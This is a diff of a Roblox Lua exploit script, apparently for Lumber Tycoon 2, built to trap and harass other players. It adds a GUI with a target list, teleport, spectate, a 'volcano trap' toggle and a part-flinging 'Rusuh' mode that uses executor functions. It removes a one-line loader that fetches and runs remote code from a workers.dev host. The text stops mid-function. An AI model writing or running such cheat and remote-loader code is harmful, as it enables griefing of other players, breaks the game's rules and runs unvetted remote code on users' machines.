@@ -1,1 +1,1114 @@
-loadstring(game:HttpGet("https://crimson-breeze-b7ad.maulanaibnu156.workers.dev/"))()
+--[[
+    Project: Kill player Bycipikturbo - LT2 Volcano Trap & Rusuh Bring Parts Integration
+    Style: Ciphub Brutal Blue Theme + Particles + Volcano Trap + Interactive Player List (Volcano & Rusuh)
+]]--
+
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local LocalPlayer = Players.LocalPlayer
+if not LocalPlayer then
+    LocalPlayer = Players.AwaitingPlayer or Players.PlayerAdded:Wait()
+end
+
+-- Status Toggle & Selected Target
+local isRunning = false
+local selectedTarget = nil
+
+-- Status Fitur Tambahan
+local glowChamsEnabled = false
+local espNameEnabled = false
+local activeSpectateConn = nil
+local spectatedPlayer = nil
+local spawnedCarReference = nil
+
+-- Koordinat Presisi Pas di Dalam Kawah / Pusat Api Volcano (Lumber Tycoon 2 Peak)
+local VolcanoPosition = Vector3.new(-1593, 442, 1317)
+local SafePosition = nil
+
+-- Bikin UI Utama dengan pengaman CoreGui / PlayerGui yang aman
+local guiParent = nil
+pcall(function()
+    if gethui then
+        guiParent = gethui()
+    end
+end)
+if not guiParent then
+    guiParent = LocalPlayer:WaitForChild("PlayerGui")
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CiphubBrutalCombinedUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = guiParent
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 250, 0, 430)
+MainFrame.Position = UDim2.new(0.5, -125, 0.33, -215)
+MainFrame.BackgroundColor3 = Color3.fromRGB(12, 18, 30)
+MainFrame.BackgroundTransparency = 0.15 
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 10)
+MainCorner.Parent = MainFrame
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(40, 130, 220)
+MainStroke.Thickness = 1.5
+MainStroke.Transparency = 0.3
+MainStroke.Parent = MainFrame
+
+-- Efek Partikel Latar Belakang Bergerak (Tema Biru)
+local ParticleContainer = Instance.new("Folder")
+ParticleContainer.Name = "BackgroundParticles"
+ParticleContainer.Parent = MainFrame
+
+task.spawn(function()
+    while ScreenGui and ScreenGui.Parent do
+        task.wait(1.0)
+        if not MainFrame or not MainFrame.Parent then break end
+        
+        local particle = Instance.new("Frame")
+        particle.Size = UDim2.new(0, math.random(3, 5), 0, math.random(3, 5))
+        particle.Position = UDim2.new(math.random(5, 95) / 100, 0, 1, 0)
+        
+        if math.random(1, 2) == 1 then
+            particle.BackgroundColor3 = Color3.fromRGB(40, 180, 255)
+        else
+            particle.BackgroundColor3 = Color3.fromRGB(80, 100, 255)
+        end
+        
+        particle.BackgroundTransparency = 0.3
+        particle.BorderSizePixel = 0
+        particle.ZIndex = 0
+        
+        local pCorner = Instance.new("UICorner")
+        pCorner.CornerRadius = UDim.new(1, 0)
+        pCorner.Parent = particle
+        
+        particle.Parent = ParticleContainer
+        
+        local targetPosY = math.random(10, 80) / 100
+        local moveTween = TweenService:Create(particle, TweenInfo.new(math.random(3, 5), Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+            Position = UDim2.new(particle.Position.X.Scale + (math.random(-10, 10)/100), 0, targetPosY, 0),
+            BackgroundTransparency = 1
+        })
+        moveTween:Play()
+        moveTween.Completed:Connect(function()
+            particle:Destroy()
+        end)
+    end
+end)
+
+local HeaderBg = Instance.new("Frame")
+HeaderBg.Size = UDim2.new(1, 0, 0, 32)
+HeaderBg.BackgroundColor3 = Color3.fromRGB(15, 25, 45)
+HeaderBg.BackgroundTransparency = 0.3
+HeaderBg.BorderSizePixel = 0
+HeaderBg.ZIndex = 1
+HeaderBg.Parent = MainFrame
+
+local HeaderCorner = Instance.new("UICorner")
+HeaderCorner.CornerRadius = UDim.new(0, 10)
+HeaderCorner.Parent = HeaderBg
+
+local IsMinimized = false
+local MinimizeBtn = Instance.new("TextButton")
+MinimizeBtn.Size = UDim2.new(0, 22, 0, 22)
+MinimizeBtn.Position = UDim2.new(0, 5, 0, 5)
+MinimizeBtn.BackgroundColor3 = Color3.fromRGB(20, 35, 55)
+MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeBtn.TextSize = 11
+MinimizeBtn.Font = Enum.Font.GothamBold
+MinimizeBtn.Text = "-"
+MinimizeBtn.ZIndex = 3
+MinimizeBtn.Parent = MainFrame
+
+local MinCorner = Instance.new("UICorner")
+MinCorner.CornerRadius = UDim.new(0, 5)
+MinCorner.Parent = MinimizeBtn
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -60, 0, 32)
+Title.BackgroundColor3 = Color3.fromRGB(0, 0, 30)
+Title.TextColor3 = Color3.fromRGB(200, 230, 255)
+Title.TextSize = 10
+Title.Font = Enum.Font.GothamBold
+Title.Text = "RUSUH Bycipikturbo 👑"
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Position = UDim2.new(0, 32, 0, 0)
+Title.BackgroundTransparency = 1
+Title.ZIndex = 2
+Title.Parent = MainFrame
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 22, 0, 22)
+CloseBtn.Position = UDim2.new(1, -27, 0, 5)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(20, 60, 100)
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.TextSize = 10
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Text = "X"
+CloseBtn.ZIndex = 3
+CloseBtn.Parent = MainFrame
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 5)
+CloseCorner.Parent = CloseBtn
+
+CloseBtn.MouseButton1Click:Connect(function()
+    if activeSpectateConn then activeSpectateConn:Disconnect() end
+    isRunning = false
+    selectedTarget = nil
+    ScreenGui:Destroy()
+end)
+
+-- Tombol Floating Open (Bisa Digeser/Draggable)
+local OpenButton = Instance.new("TextButton")
+OpenButton.Size = UDim2.new(0, 45, 0, 45)
+OpenButton.Position = UDim2.new(0.02, 0, 0.5, 0)
+OpenButton.BackgroundColor3 = Color3.fromRGB(20, 90, 150)
+OpenButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+OpenButton.TextSize = 12
+OpenButton.Font = Enum.Font.GothamBold
+OpenButton.Text = "OPEN"
+OpenButton.Visible = false
+OpenButton.Active = true
+OpenButton.Draggable = true
+OpenButton.Parent = ScreenGui
+
+local OpenCorner = Instance.new("UICorner")
+OpenCorner.CornerRadius = UDim.new(1, 0)
+OpenCorner.Parent = OpenButton
+
+-- Tombol Tab Navigation (3 Tab: TRAP, RUSUH, SETTINGS)
+local Tab1Btn = Instance.new("TextButton")
+Tab1Btn.Size = UDim2.new(0.33, -3, 0, 24)
+Tab1Btn.Position = UDim2.new(0, 4, 0, 36)
+Tab1Btn.BackgroundColor3 = Color3.fromRGB(20, 70, 130)
+Tab1Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+Tab1Btn.TextSize = 9
+Tab1Btn.Font = Enum.Font.GothamBold
+Tab1Btn.Text = "VOLCANO"
+Tab1Btn.ZIndex = 2
+Tab1Btn.Parent = MainFrame
+
+local Tab1Corner = Instance.new("UICorner")
+Tab1Corner.CornerRadius = UDim.new(0, 6)
+Tab1Corner.Parent = Tab1Btn
+
+local Tab2Btn = Instance.new("TextButton")
+Tab2Btn.Size = UDim2.new(0.33, -3, 0, 24)
+Tab2Btn.Position = UDim2.new(0.33, 2, 0, 36)
+Tab2Btn.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+Tab2Btn.TextColor3 = Color3.fromRGB(160, 180, 200)
+Tab2Btn.TextSize = 9
+Tab2Btn.Font = Enum.Font.GothamBold
+Tab2Btn.Text = "RUSUH"
+Tab2Btn.ZIndex = 2
+Tab2Btn.Parent = MainFrame
+
+local Tab2Corner = Instance.new("UICorner")
+Tab2Corner.CornerRadius = UDim.new(0, 6)
+Tab2Corner.Parent = Tab2Btn
+
+local Tab3Btn = Instance.new("TextButton")
+Tab3Btn.Size = UDim2.new(0.33, -3, 0, 24)
+Tab3Btn.Position = UDim2.new(0.66, 0, 0, 36)
+Tab3Btn.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+Tab3Btn.TextColor3 = Color3.fromRGB(160, 180, 200)
+Tab3Btn.TextSize = 9
+Tab3Btn.Font = Enum.Font.GothamBold
+Tab3Btn.Text = "SETTINGS"
+Tab3Btn.ZIndex = 2
+Tab3Btn.Parent = MainFrame
+
+local Tab3Corner = Instance.new("UICorner")
+Tab3Corner.CornerRadius = UDim.new(0, 6)
+Tab3Corner.Parent = Tab3Btn
+
+-- ==================== CONTAINER 1: VOLCANO TRAP ====================
+local TrapContainer = Instance.new("Frame")
+TrapContainer.Size = UDim2.new(1, 0, 1, -68)
+TrapContainer.Position = UDim2.new(0, 0, 0, 68)
+TrapContainer.BackgroundTransparency = 1
+TrapContainer.Visible = true
+TrapContainer.ZIndex = 2
+TrapContainer.Parent = MainFrame
+
+local TargetLabel = Instance.new("TextLabel")
+TargetLabel.Size = UDim2.new(0.92, 0, 0, 18)
+TargetLabel.Position = UDim2.new(0.04, 0, 0.01, 0)
+TargetLabel.BackgroundTransparency = 1
+TargetLabel.TextColor3 = Color3.fromRGB(100, 180, 255)
+TargetLabel.TextSize = 9.5
+TargetLabel.Font = Enum.Font.GothamBold
+TargetLabel.Text = "TARGET: (Belum dipilih)"
+TargetLabel.ZIndex = 2
+TargetLabel.Parent = TrapContainer
+
+local PlayerListScroll = Instance.new("ScrollingFrame")
+PlayerListScroll.Size = UDim2.new(0.92, 0, 0, 155)
+PlayerListScroll.Position = UDim2.new(0.04, 0, 0.08, 0)
+PlayerListScroll.BackgroundColor3 = Color3.fromRGB(16, 22, 35)
+PlayerListScroll.BackgroundTransparency = 0.3
+PlayerListScroll.BorderSizePixel = 0
+PlayerListScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+PlayerListScroll.ScrollBarThickness = 4
+PlayerListScroll.ZIndex = 2
+PlayerListScroll.Parent = TrapContainer
+
+local ScrollCorner = Instance.new("UICorner")
+ScrollCorner.CornerRadius = UDim.new(0, 6)
+ScrollCorner.Parent = PlayerListScroll
+
+local UIListLayout1 = Instance.new("UIListLayout")
+UIListLayout1.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout1.Padding = UDim.new(0, 4)
+UIListLayout1.Parent = PlayerListScroll
+
+-- Deklarasi Variabel Global untuk Menu Rusuh
+local RusuhTargetLabel
+local RusuhPlayerListScroll
+local refreshPlayerList -- forward declaration
+
+refreshPlayerList = function()
+    -- Refresh Volcano List
+    for _, child in pairs(PlayerListScroll:GetChildren()) do
+        if child:IsA("Frame") then
+            child:Destroy()
+        end
+    end
+    -- Refresh Rusuh List
+    if RusuhPlayerListScroll then
+        for _, child in pairs(RusuhPlayerListScroll:GetChildren()) do
+            if child:IsA("Frame") then
+                child:Destroy()
+            end
+        end
+    end
+
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then
+            -- 1. BUILD ITEM FOR VOLCANO TAB
+            local pItem = Instance.new("Frame")
+            pItem.Size = UDim2.new(1, 0, 0, 32)
+            pItem.BackgroundColor3 = Color3.fromRGB(22, 32, 50)
+            pItem.BackgroundTransparency = 0.4
+            pItem.BorderSizePixel = 0
+            pItem.ZIndex = 2
+            pItem.Parent = PlayerListScroll
+
+            local itemCorner = Instance.new("UICorner")
+            itemCorner.CornerRadius = UDim.new(0, 6)
+            itemCorner.Parent = pItem
+
+            local icon = Instance.new("ImageLabel")
+            icon.Size = UDim2.new(0, 24, 0, 24)
+            icon.Position = UDim2.new(0, 4, 0.5, -12)
+            icon.BackgroundTransparency = 1
+            icon.Image = "rbxthumb://type=AvatarHeadShot&id=" .. p.UserId .. "&w=150&h=150"
+            icon.ZIndex = 3
+            icon.Parent = pItem
+
+            local nameLbl = Instance.new("TextLabel")
+            nameLbl.Size = UDim2.new(0.40, 0, 0, 15)
+            nameLbl.Position = UDim2.new(0, 32, 0, 2)
+            nameLbl.BackgroundTransparency = 1
+            nameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+            nameLbl.TextSize = 9.5
+            nameLbl.Font = Enum.Font.GothamBold
+            nameLbl.Text = p.DisplayName
+            nameLbl.TextXAlignment = Enum.TextXAlignment.Left
+            nameLbl.ZIndex = 3
+            nameLbl.Parent = pItem
+
+            local tagLbl = Instance.new("TextLabel")
+            tagLbl.Size = UDim2.new(0.40, 0, 0, 12)
+            tagLbl.Position = UDim2.new(0, 32, 0, 17)
+            tagLbl.BackgroundTransparency = 1
+            tagLbl.TextColor3 = Color3.fromRGB(160, 190, 220)
+            tagLbl.TextSize = 8
+            tagLbl.Font = Enum.Font.Gotham
+            tagLbl.Text = "@" .. p.Name
+            tagLbl.TextXAlignment = Enum.TextXAlignment.Left
+            tagLbl.ZIndex = 3
+            tagLbl.Parent = pItem
+
+            local selectHitbox = Instance.new("TextButton")
+            selectHitbox.Size = UDim2.new(0.50, 0, 1, 0)
+            selectHitbox.BackgroundTransparency = 1
+            selectHitbox.Text = ""
+            selectHitbox.ZIndex = 3
+            selectHitbox.Parent = pItem
+
+            selectHitbox.MouseButton1Click:Connect(function()
+                selectedTarget = p
+                TargetLabel.Text = "TARGET: " .. p.Name
+                TargetLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+            end)
+
+            local tpBtn = Instance.new("TextButton")
+            tpBtn.Size = UDim2.new(0, 24, 0, 22)
+            tpBtn.Position = UDim2.new(1, -54, 0.5, -11)
+            tpBtn.BackgroundColor3 = Color3.fromRGB(30, 50, 80)
+            tpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            tpBtn.TextSize = 9
+            tpBtn.Font = Enum.Font.GothamBold
+            tpBtn.Text = "TP"
+            tpBtn.ZIndex = 3
+            tpBtn.Parent = pItem
+
+            local tpCorner = Instance.new("UICorner")
+            tpCorner.CornerRadius = UDim.new(0, 4)
+            tpCorner.Parent = tpBtn
+
+            tpBtn.MouseButton1Click:Connect(function()
+                selectedTarget = p
+                TargetLabel.Text = "TARGET: " .. p.Name
+                TargetLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+                local myChar = LocalPlayer.Character
+                local targetChar = p.Character
+                if myChar and targetChar and myChar:FindFirstChild("HumanoidRootPart") and targetChar:FindFirstChild("HumanoidRootPart") then
+                    myChar.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                end
+            end)
+
+            local spBtn = Instance.new("TextButton")
+            spBtn.Size = UDim2.new(0, 24, 0, 22)
+            spBtn.Position = UDim2.new(1, -26, 0.5, -11)
+            spBtn.BackgroundColor3 = Color3.fromRGB(30, 50, 80)
+            spBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            spBtn.TextSize = 9
+            spBtn.Font = Enum.Font.GothamBold
+            spBtn.Text = "SP"
+            spBtn.ZIndex = 3
+            spBtn.Parent = pItem
+
+            local spCorner = Instance.new("UICorner")
+            spCorner.CornerRadius = UDim.new(0, 4)
+            spCorner.Parent = spBtn
+
+            spBtn.MouseButton1Click:Connect(function()
+                if spectatedPlayer == p then
+                    if activeSpectateConn then activeSpectateConn:Disconnect() end
+                    Workspace.CurrentCamera.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
+                    spectatedPlayer = nil
+                    spBtn.BackgroundColor3 = Color3.fromRGB(30, 50, 80)
+                else
+                    if activeSpectateConn then activeSpectateConn:Disconnect() end
+                    spectatedPlayer = p
+                    spBtn.BackgroundColor3 = Color3.fromRGB(30, 130, 80)
+                    activeSpectateConn = RunService.RenderStepped:Connect(function()
+                        if p.Character and p.Character:FindFirstChild("Humanoid") then
+                            Workspace.CurrentCamera.CameraSubject = p.Character.Humanoid
+                        end
+                    end)
+                end
+            end)
+
+            -- 2. BUILD SPECIAL INDEPENDENT ITEM FOR RUSUH TAB
+            if RusuhPlayerListScroll then
+                local pItemR = Instance.new("Frame")
+                pItemR.Size = UDim2.new(1, 0, 0, 32)
+                pItemR.BackgroundColor3 = Color3.fromRGB(25, 35, 55)
+                pItemR.BackgroundTransparency = 0.4
+                pItemR.BorderSizePixel = 0
+                pItemR.ZIndex = 2
+                pItemR.Parent = RusuhPlayerListScroll
+
+                local itemCornerR = Instance.new("UICorner")
+                itemCornerR.CornerRadius = UDim.new(0, 6)
+                itemCornerR.Parent = pItemR
+
+                local iconR = Instance.new("ImageLabel")
+                iconR.Size = UDim2.new(0, 24, 0, 24)
+                iconR.Position = UDim2.new(0, 4, 0.5, -12)
+                iconR.BackgroundTransparency = 1
+                iconR.Image = "rbxthumb://type=AvatarHeadShot&id=" .. p.UserId .. "&w=150&h=150"
+                iconR.ZIndex = 3
+                iconR.Parent = pItemR
+
+                local nameLblR = Instance.new("TextLabel")
+                nameLblR.Size = UDim2.new(0.40, 0, 0, 15)
+                nameLblR.Position = UDim2.new(0, 32, 0, 2)
+                nameLblR.BackgroundTransparency = 1
+                nameLblR.TextColor3 = Color3.fromRGB(255, 255, 255)
+                nameLblR.TextSize = 9.5
+                nameLblR.Font = Enum.Font.GothamBold
+                nameLblR.Text = p.DisplayName
+                nameLblR.TextXAlignment = Enum.TextXAlignment.Left
+                nameLblR.ZIndex = 3
+                nameLblR.Parent = pItemR
+
+                local tagLblR = Instance.new("TextLabel")
+                tagLblR.Size = UDim2.new(0.40, 0, 0, 12)
+                tagLblR.Position = UDim2.new(0, 32, 0, 17)
+                tagLblR.BackgroundTransparency = 1
+                tagLblR.TextColor3 = Color3.fromRGB(160, 190, 220)
+                tagLblR.TextSize = 8
+                tagLblR.Font = Enum.Font.Gotham
+                tagLblR.Text = "@" .. p.Name
+                tagLblR.TextXAlignment = Enum.TextXAlignment.Left
+                tagLblR.ZIndex = 3
+                tagLblR.Parent = pItemR
+
+                local selectHitboxR = Instance.new("TextButton")
+                selectHitboxR.Size = UDim2.new(0.50, 0, 1, 0)
+                selectHitboxR.BackgroundTransparency = 1
+                selectHitboxR.Text = ""
+                selectHitboxR.ZIndex = 3
+                selectHitboxR.Parent = pItemR
+
+                selectHitboxR.MouseButton1Click:Connect(function()
+                    _G.RusuhTargetPlayer = p
+                    if RusuhTargetLabel then
+                        RusuhTargetLabel.Text = "RUSUH TARGET: " .. p.Name
+                        RusuhTargetLabel.TextColor3 = Color3.fromRGB(100, 180, 255)
+                    end
+                end)
+
+                local tpBtnR = Instance.new("TextButton")
+                tpBtnR.Size = UDim2.new(0, 24, 0, 22)
+                tpBtnR.Position = UDim2.new(1, -54, 0.5, -11)
+                tpBtnR.BackgroundColor3 = Color3.fromRGB(30, 60, 90)
+                tpBtnR.TextColor3 = Color3.fromRGB(255, 255, 255)
+                tpBtnR.TextSize = 9
+                tpBtnR.Font = Enum.Font.GothamBold
+                tpBtnR.Text = "TP"
+                tpBtnR.ZIndex = 3
+                tpBtnR.Parent = pItemR
+
+                local tpCornerR = Instance.new("UICorner")
+                tpCornerR.CornerRadius = UDim.new(0, 4)
+                tpCornerR.Parent = tpBtnR
+
+                tpBtnR.MouseButton1Click:Connect(function()
+                    _G.RusuhTargetPlayer = p
+                    if RusuhTargetLabel then
+                        RusuhTargetLabel.Text = "RUSUH TARGET: " .. p.Name
+                        RusuhTargetLabel.TextColor3 = Color3.fromRGB(100, 180, 255)
+                    end
+                    local myChar = LocalPlayer.Character
+                    local targetChar = p.Character
+                    if myChar and targetChar and myChar:FindFirstChild("HumanoidRootPart") and targetChar:FindFirstChild("HumanoidRootPart") then
+                        myChar.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                    end
+                end)
+
+                local spBtnR = Instance.new("TextButton")
+                spBtnR.Size = UDim2.new(0, 24, 0, 22)
+                spBtnR.Position = UDim2.new(1, -26, 0.5, -11)
+                spBtnR.BackgroundColor3 = Color3.fromRGB(30, 60, 90)
+                spBtnR.TextColor3 = Color3.fromRGB(255, 255, 255)
+                spBtnR.TextSize = 9
+                spBtnR.Font = Enum.Font.GothamBold
+                spBtnR.Text = "SP"
+                spBtnR.ZIndex = 3
+                spBtnR.Parent = pItemR
+
+                local spCornerR = Instance.new("UICorner")
+                spCornerR.CornerRadius = UDim.new(0, 4)
+                spCornerR.Parent = spBtnR
+
+                spBtnR.MouseButton1Click:Connect(function()
+                    if spectatedPlayer == p then
+                        if activeSpectateConn then activeSpectateConn:Disconnect() end
+                        Workspace.CurrentCamera.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
+                        spectatedPlayer = nil
+                        spBtnR.BackgroundColor3 = Color3.fromRGB(30, 60, 90)
+                    else
+                        if activeSpectateConn then activeSpectateConn:Disconnect() end
+                        spectatedPlayer = p
+                        spBtnR.BackgroundColor3 = Color3.fromRGB(30, 130, 80)
+                        activeSpectateConn = RunService.RenderStepped:Connect(function()
+                            if p.Character and p.Character:FindFirstChild("Humanoid") then
+                                Workspace.CurrentCamera.CameraSubject = p.Character.Humanoid
+                            end
+                        end)
+                    end
+                end)
+            end
+        end
+    end
+    PlayerListScroll.CanvasSize = UDim2.new(0, 0, 0, UIListLayout1.AbsoluteContentSize.Y)
+    if RusuhPlayerListScroll then
+        local layoutR = RusuhPlayerListScroll:FindFirstChildOfClass("UIListLayout")
+        if layoutR then
+            RusuhPlayerListScroll.CanvasSize = UDim2.new(0, 0, 0, layoutR.AbsoluteContentSize.Y)
+        end
+    end
+end
+
+refreshPlayerList()
+
+task.spawn(function()
+    while true do
+        task.wait(2.5)
+        if ScreenGui and ScreenGui.Parent then
+            refreshPlayerList()
+        else
+            break
+        end
+    end
+end)
+
+local ToggleButton = Instance.new("TextButton")
+ToggleButton.Size = UDim2.new(0.92, 0, 0, 30)
+ToggleButton.Position = UDim2.new(0.04, 0, 0.55, 0)
+ToggleButton.BackgroundColor3 = Color3.fromRGB(80, 20, 40)
+ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleButton.TextSize = 9.5
+ToggleButton.Font = Enum.Font.GothamBold
+ToggleButton.Text = "OFF"
+ToggleButton.ZIndex = 2
+ToggleButton.Parent = TrapContainer
+
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(0, 6)
+ToggleCorner.Parent = ToggleButton
+
+ToggleButton.MouseButton1Click:Connect(function()
+    if not selectedTarget then
+        TargetLabel.Text = "PILIH TARGET DULU DI LIST!"
+        TargetLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
+        return
+    end
+
+    local myChar = LocalPlayer.Character
+    if myChar and myChar:FindFirstChild("HumanoidRootPart") then
+        SafePosition = myChar.HumanoidRootPart.CFrame
+    end
+
+    isRunning = not isRunning
+    if isRunning then
+        ToggleButton.BackgroundColor3 = Color3.fromRGB(20, 120, 60)
+        ToggleButton.Text = "ON"
+    else
+        ToggleButton.BackgroundColor3 = Color3.fromRGB(80, 20, 40)
+        ToggleButton.Text = "OFF"
+    end
+end)
+
+local function executeTeleportToCar()
+    local character = LocalPlayer.Character
+    if not character or not character:FindFirstChild("HumanoidRootPart") then return end
+
+    local targetPart = nil
+    if spawnedCarReference and spawnedCarReference.Parent then
+        targetPart = spawnedCarReference.PrimaryPart 
+            or spawnedCarReference:FindFirstChild("Chassis") 
+            or spawnedCarReference:FindFirstChild("VehicleSeat") 
+            or spawnedCarReference:FindFirstChild("Body") 
+            or spawnedCarReference:FindFirstChildWhichIsA("BasePart")
+    end
+
+    if not targetPart then
+        local shortestDistance = math.huge
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            if obj:IsA("Model") and obj ~= character then
+                local carPart = obj:FindFirstChild("VehicleSeat") 
+                    or obj:FindFirstChild("Chassis") 
+                    or obj:FindFirstChildWhichIsA("VehicleSeat")
+                if carPart then
+                    local distance = (carPart.Position - character.HumanoidRootPart.Position).Magnitude
+                    if distance < shortestDistance then
+                        shortestDistance = distance
+                        targetPart = carPart
+                    end
+                end
+            end
+        end
+    end
+
+    if targetPart then
+        local driverSideCFrame = targetPart.CFrame + (targetPart.CFrame.RightVector * -3) + Vector3.new(0, 3, 0)
+        character.HumanoidRootPart.CFrame = driverSideCFrame
+    end
+end
+
+local TpCarButton = Instance.new("TextButton")
+TpCarButton.Size = UDim2.new(0.92, 0, 0, 30)
+TpCarButton.Position = UDim2.new(0.04, 0, 0.69, 0)
+TpCarButton.BackgroundColor3 = Color3.fromRGB(30, 45, 85)
+TpCarButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TpCarButton.TextSize = 9.5
+TpCarButton.Font = Enum.Font.GothamBold
+TpCarButton.Text = "🚗 TP TO CAR"
+TpCarButton.ZIndex = 2
+TpCarButton.Parent = TrapContainer
+
+local TpCarCorner = Instance.new("UICorner")
+TpCarCorner.CornerRadius = UDim.new(0, 6)
+TpCarCorner.Parent = TpCarButton
+
+TpCarButton.MouseButton1Click:Connect(function()
+    executeTeleportToCar()
+end)
+
+
+-- ==================== CONTAINER 2: RUSUH / BRING PARTS ====================
+local RusuhContainer = Instance.new("Frame")
+RusuhContainer.Size = UDim2.new(1, 0, 1, -68)
+RusuhContainer.Position = UDim2.new(0, 0, 0, 68)
+RusuhContainer.BackgroundTransparency = 1
+RusuhContainer.Visible = false
+RusuhContainer.ZIndex = 2
+RusuhContainer.Parent = MainFrame
+
+RusuhTargetLabel = Instance.new("TextLabel")
+RusuhTargetLabel.Size = UDim2.new(0.92, 0, 0, 18)
+RusuhTargetLabel.Position = UDim2.new(0.04, 0, 0.01, 0)
+RusuhTargetLabel.BackgroundTransparency = 1
+RusuhTargetLabel.TextColor3 = Color3.fromRGB(160, 200, 255)
+RusuhTargetLabel.TextSize = 9.5
+RusuhTargetLabel.Font = Enum.Font.GothamBold
+RusuhTargetLabel.Text = "RUSUH TARGET: (Pilih di List / Ketik bawah)"
+RusuhTargetLabel.ZIndex = 2
+RusuhTargetLabel.Parent = RusuhContainer
+
+-- INTERACTIVE PLAYER LIST KHUSUS DI TAB RUSUH
+RusuhPlayerListScroll = Instance.new("ScrollingFrame")
+RusuhPlayerListScroll.Size = UDim2.new(0.92, 0, 0, 120)
+RusuhPlayerListScroll.Position = UDim2.new(0.04, 0, 0.08, 0)
+RusuhPlayerListScroll.BackgroundColor3 = Color3.fromRGB(16, 22, 35)
+RusuhPlayerListScroll.BackgroundTransparency = 0.3
+RusuhPlayerListScroll.BorderSizePixel = 0
+RusuhPlayerListScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+RusuhPlayerListScroll.ScrollBarThickness = 4
+RusuhPlayerListScroll.ZIndex = 2
+RusuhPlayerListScroll.Parent = RusuhContainer
+
+local RusuhScrollCorner = Instance.new("UICorner")
+RusuhScrollCorner.CornerRadius = UDim.new(0, 6)
+RusuhScrollCorner.Parent = RusuhPlayerListScroll
+
+local UIListLayoutRusuh = Instance.new("UIListLayout")
+UIListLayoutRusuh.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayoutRusuh.Padding = UDim.new(0, 4)
+UIListLayoutRusuh.Parent = RusuhPlayerListScroll
+
+local RusuhBox = Instance.new("TextBox")
+RusuhBox.Size = UDim2.new(0.92, 0, 0, 28)
+RusuhBox.Position = UDim2.new(0.04, 0, 0.38, 0)
+RusuhBox.BackgroundColor3 = Color3.fromRGB(20, 40, 70)
+RusuhBox.BackgroundTransparency = 0.4
+RusuhBox.PlaceholderText = "Ketik Nama Target Rusuh..."
+RusuhBox.Text = ""
+RusuhBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+RusuhBox.TextSize = 10
+RusuhBox.Font = Enum.Font.GothamBold
+RusuhBox.ZIndex = 2
+RusuhBox.Parent = RusuhContainer
+
+local RusuhBoxCorner = Instance.new("UICorner")
+RusuhBoxCorner.CornerRadius = UDim.new(0, 6)
+RusuhBoxCorner.Parent = RusuhBox
+
+local RusuhExecBtn = Instance.new("TextButton")
+RusuhExecBtn.Size = UDim2.new(0.92, 0, 0, 38)
+RusuhExecBtn.Position = UDim2.new(0.04, 0, 0.49, 0)
+RusuhExecBtn.BackgroundColor3 = Color3.fromRGB(20, 80, 150)
+RusuhExecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+RusuhExecBtn.TextSize = 12
+RusuhExecBtn.Font = Enum.Font.GothamBold
+RusuhExecBtn.Text = "RUSUH OFF"
+RusuhExecBtn.ZIndex = 2
+RusuhExecBtn.Parent = RusuhContainer
+
+local RusuhExecCorner = Instance.new("UICorner")
+RusuhExecCorner.CornerRadius = UDim.new(0, 6)
+RusuhExecCorner.Parent = RusuhExecBtn
+
+-- Logika Bring Parts / Network Physics
+local Folder = Instance.new("Folder", Workspace)
+local Part = Instance.new("Part", Folder)
+local Attachment1 = Instance.new("Attachment", Part)
+Part.Anchored = true
+Part.CanCollide = false
+Part.Transparency = 1
+
+if not getgenv().Network then
+    getgenv().Network = {
+        BaseParts = {},
+        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
+    }
+
+    Network.RetainPart = function(pItem)
+        if pItem:IsA("BasePart") and pItem:IsDescendantOf(Workspace) then
+            table.insert(Network.BaseParts, pItem)
+            pItem.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
+            pItem.CanCollide = false
+        end
+    end
+
+    local function EnablePartControl()
